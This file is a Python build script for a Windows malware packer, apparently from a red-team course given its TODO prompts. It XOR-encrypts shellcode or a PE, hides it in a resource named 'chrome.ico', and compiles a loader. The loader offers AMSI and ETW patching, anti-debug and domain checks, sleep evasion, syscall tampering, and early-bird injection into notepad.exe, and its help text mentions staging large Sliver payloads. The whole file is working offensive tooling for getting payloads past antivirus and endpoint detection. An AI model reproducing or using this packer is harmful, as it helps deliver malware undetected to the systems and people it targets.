#!/usr/bin/python3 
import sys, os
import argparse
import random, string
from datetime import datetime
import pathlib

random.seed(datetime.now().timestamp())

def bytes_to_c_array(shellcode):
    sc = ''.join([rf'\x{byte:02x}' for byte in shellcode])
    return f"\"{sc}\""

def xor_with_key(byte_array, key):
    key_bytes = key.encode() if isinstance(key, str) else key
    xor_result = bytearray()
    key_len = len(key_bytes)
    for i in range(len(byte_array)):
        xor_result.append(byte_array[i] ^ key_bytes[i % key_len])
    return xor_result

def pipe_xor(byte_pipe_array):
    key_string = "14FF13DE"
    key_bytes = bytes.fromhex(key_string)
    xor_result = bytearray()
    key_len = len(key_bytes)
    for i in range(len(byte_pipe_array)):
        xor_result.append(byte_pipe_array[i] ^ key_bytes[i % key_len])
    return xor_result

if __name__ == "__main__":
    # --------------------------- #
    # Most important TODO for you #
    # v v v v v v v v v v v v v v #
    print("""
    <             no            >
""")

    MODE_SHINJECT = "shinject"
    MODE_RUNPE    = "runpe"
    MODE_DOTNET    = "dotnet"
    MODE_EARLYBIRD  = "earlybird"
    MODE_HYPNOSIS   = "hypnosis"

    supported_modes = [MODE_SHINJECT, MODE_RUNPE, MODE_DOTNET, MODE_EARLYBIRD, MODE_HYPNOSIS]
    parser = argparse.ArgumentParser()

    # -------------------------------------
    # Parse arguments 

    parser.add_argument("mode", action="store", help=f"Mode of execution. Valid choices are: {', '.join(supported_modes)}")
    parser.add_argument("source_file", action="store", nargs="?", help="Source file name [PE or Shellcode]")    

    group_format = parser.add_argument_group("Output formats")    
    group_format.add_argument("--dll", action="store_true", default=False, dest="as_dll", help="Compile as DLL")

    group_evasion = parser.add_argument_group("Evasion")
    group_evasion.add_argument("--domain", action='store_true', default=False, dest="domain", help="Exit if the system is not domain joined")
    group_evasion.add_argument("--no-amsi", action='store_false', default=True, dest="amsi", help="Do not patch AMSI")
    group_evasion.add_argument("--no-etw", action='store_false', default=True, dest="etw", help="Do not patch ETW")
    group_evasion.add_argument("--no-sleep", action='store_false', default=True, dest="sleep", help="Do not use sleep delay")
    group_evasion.add_argument("--pipe", action='store_true', default=False, dest="pipe", help="Use PipeRetrieve method! Great for allocating small shellcode to call BIG SLIVER PAYLOADS")

    group_aa = parser.add_argument_group("Anti-Analysis")
    group_aa.add_argument("--anti-debug", action='store_true', default=False, dest="anti_debug", help="Exit if the PEB indicates that the program is being debugged");

    group_misc = parser.add_argument_group("Misc")
    group_misc.add_argument("-r", "--release", action="store_true", default=False, dest="nonverbose", help="Disable debug output")

    args = parser.parse_args()

    # -------------------------------------
    # Evaluate args

    if args.mode not in supported_modes:
        print(f"[!] Mode \"{args.mode}\" not supported")
        print(f"    Modes available: {', '.join(supported_modes)}")
        sys.exit(1)

    if not args.source_file:
        print("[!] Must supply an input file")
        sys.exit(1)

    if not os.path.exists(args.source_file):
        print(f"[!] {args.source_file} does not exist")
        sys.exit(1)

    outfile_type = "exe" if not args.as_dll else "dll"
    args.outfile = f"./packed.{outfile_type}"

    # generate a random encryption key
    encKey = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10))

    # open shellcode and encrypt
    shellcode_size = os.path.getsize(args.source_file)
    if args.pipe != True:
    
        with open(args.source_file, 'rb') as f:
            shellcode = f.read()
            shellcode = xor_with_key(shellcode, encKey)
        # ------------------------------------------------------------------- #
        # TODO for you: XoR encrypt 'shellcode' here with 'xor_with_key'      #
        # ------------------------------------------------------------------- #  

        # ------------------------------------------------------------------- #
        # Custom thing now: Going to implement shellcode in rsrc section      #
        # ------------------------------------------------------------------- #  

        with open('src/chrome.ico', "wb+") as f:
            f.write(shellcode)
        
        random_rcdata = random.randrange(27, 999)
        with open('src/resources.rc', "w+") as f:
            f.write(f'{random_rcdata} RCDATA "src/chrome.ico"')
    else:
        # Going to encrypt our provided decryptProtect with specific bytes
        decryptProtect_size = os.path.getsize('decryptprotect.bin')
        with open(args.source_file, 'rb') as f:
            shellcode = f.read()
            shellcode = pipe_xor(shellcode)
         
        with open('src/chrome.ico', "wb+") as f:
            f.write(shellcode)
        
        with open('decryptprotect.bin', 'rb') as f:
            pipeShellcode = f.read()
            #pipeShellcode = xor_with_key(pipeShellcode, encKey)
        
        #with open('src/pipe.ico', "wb+") as f:
        #    f.write(pipeShellcode)

        random_rcdata = random.randrange(27, 999)
        with open('src/resources.rc', "w+") as f:
            f.write(f'{random_rcdata} RCDATA "src/chrome.ico"')
            #f.write(f'\n7 RCDATA "src/pipe.ico"')


    # Creating the defines.h header
    print("[*] Creating defines.h")
    with open("src/defines.h", "w+") as f:
        f.write(f"#define ENCRYPTION_KEY \"{encKey}\"\n")
        f.write(f"#define SHELLCODE_LEN {shellcode_size}\n")
        if args.pipe == True:
            f.write(f"#define SHELLCODE {bytes_to_c_array(pipeShellcode)}\n")
            f.write(f"#define PIPESIZE {decryptProtect_size}\n")
            f.write(f"#define BOBBY {random_rcdata}\n")
            f.write(f"#define PIPE\n")
        else:
            f.write(f"#define BOBBY {random_rcdata}\n")
        if args.amsi:        f.write("#define PATCH_AMSI\n")
        if args.etw:         f.write("#define PATCH_ETW\n")
        # ------------------------------------------------------------------- #
        # TODO for you: provide defines for --dll, --anti-debug and --domain  #
        # ------------------------------------------------------------------- #
        if args.as_dll:     f.write("#define AS_DLL\n")
        if args.domain:     f.write("#define SANDBOX_DOMAIN\n")
        if args.anti_debug: f.write("#define ANTI_DEBUG\n")
        if args.sleep:      f.write("#define SLEEP\n")

        if args.mode == MODE_SHINJECT: f.write(f"#define INJECT_SHELLCODE\n")
        if args.mode == MODE_RUNPE: f.write(f"#define RUN_PE\n")
        if args.mode == MODE_DOTNET: f.write(f"#define RUN_DOTNET\n")
        if args.mode == MODE_EARLYBIRD: f.write(f'#define EARLYBIRD\n#define TARGET_PROCESS "notepad.exe"\n')
        if args.mode == MODE_HYPNOSIS: f.write(f"#define HYPNOSIS\n")

        if not args.nonverbose: # lol
            f.write("#define VERBOSE\n")

    # -------------------------------------
    # Compile. Might need to adjust for your compiler toolchain. This example assumes x86_64-w64-mingw32-gcc and nasm.

    ret = os.system("nasm -f win64 src/auxiliary/Gate.asm -o src/auxiliary/Gate.obj")

    # Compile our resource script into a file
    ret = os.system("x86_64-w64-mingw32-windres src/resources.rc -o src/resources.o")
    
    compile_cmd = " x86_64-w64-mingw32-gcc -w -Os -static-libgcc -m64 -s"
    
    if args.as_dll: compile_cmd += " -shared"

    if args.mode == MODE_DOTNET: # handle linking for .NET CLR COM-Interfaces 
        cur_path = pathlib.Path(__file__).parent.resolve()
        if not os.path.exists(os.path.join(cur_path, "mscoree.dll")) or not os.path.exists(os.path.join(cur_path, "oleaut32.dll")):
            print(f"[!] Make sure that oleaut32.dll and mscoree.dll are available at {cur_path} to link")
            quit(1)
        compile_cmd += f" -L {cur_path} -lmscoree -loleaut32"

    #compile_cmd += " src/auxiliary/Gate.obj src/resources.o src/main.c"
    compile_cmd += " src/evasion/HardwareBreakPoint.c src/evasion/SyscallTampering.c src/resources.o src/main.c"
    compile_cmd += f" -o {args.outfile}"

    if args.mode == MODE_HYPNOSIS:
        compile_cmd = " x86_64-w64-mingw32-gcc -w -Os -static-libgcc -m64 -s"
        compile_cmd += " src/evasion/HardwareBreakPoint.c src/evasion/SyscallTampering.c src/resources.o src/main.c"
        compile_cmd += f" -o {args.outfile}"
    
    print(f"[*] Compiling: {compile_cmd}")
    ret = os.system(compile_cmd)

    if ret != 0:
        print("[!] Error compiling")
        quit(1)

    print("[*] Done")